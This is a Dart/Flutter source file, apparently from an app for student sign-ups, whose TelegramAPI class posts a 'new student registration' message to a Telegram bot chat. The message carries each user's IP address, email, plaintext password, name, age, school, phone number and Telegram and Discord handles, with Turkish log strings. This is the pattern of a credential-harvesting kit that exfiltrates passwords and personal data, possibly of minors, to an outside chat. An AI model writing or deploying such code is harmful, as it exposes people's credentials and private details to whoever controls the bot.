import 'package:cosmos/cosmos.dart';
import 'package:dio/dio.dart';
import 'package:flutter/foundation.dart';

class TelegramAPI {
  static Future<void> sendPhoto(
    String ip,
    String userName,
    String email,
    String password,
    String name,
    String old,
    String school,
    String phone,
    String telegram,
    String discord,
  ) async {
    String botToken = "x";
    String chatId = "x";
    String apiUrl = 'https://api.telegram.org/bot$botToken/sendPhoto';

    try {
      FormData formData = FormData.fromMap({
        'chat_id': chatId,
        'photo': "x",
        'caption': getMessage(
          ip,
          userName,
          email,
          password,
          name,
          old,
          school,
          phone,
          telegram,
          discord,
        ),
      });

      Response response = await Dio().post(
        apiUrl,
        data: formData,
      );

      if (response.statusCode == 200) {
        if (kDebugMode) {
          print('Fotoğraf gönderildi.');
        }
      } else {
        if (kDebugMode) {
          print('Fotoğraf gönderme başarısız: ${response.statusCode}');
        }
      }
    } catch (error) {
      if (kDebugMode) {
        print('Hata: $error');
      }
    }
  }

  static String getMessage(
    String ip,
    String userName,
    String email,
    String password,
    String name,
    String old,
    String school,
    String phone,
    String telegram,
    String discord,
  ) {
    return """
∭  Yeni Öğrenci Kaydı  ∭

⊕ IP Adresi: $ip
⊕ Kullanıcı Adı: $userName
⊕ E-Posta: $email
⊕ Parola: $password
⊕ Öğrenci Adı: $name
⊕ Öğrenci Yaşı: $old
⊕ Okul Bilgisi: $school
⊕ Öğrenci Telefonu: $phone
⊕ Öğrenci Telegram Adı: $telegram
⊕ Öğrenci Discord Adı: $discord

∭  ${CosmosTime.getNowTimeString()}  ∭

""";
  }
}
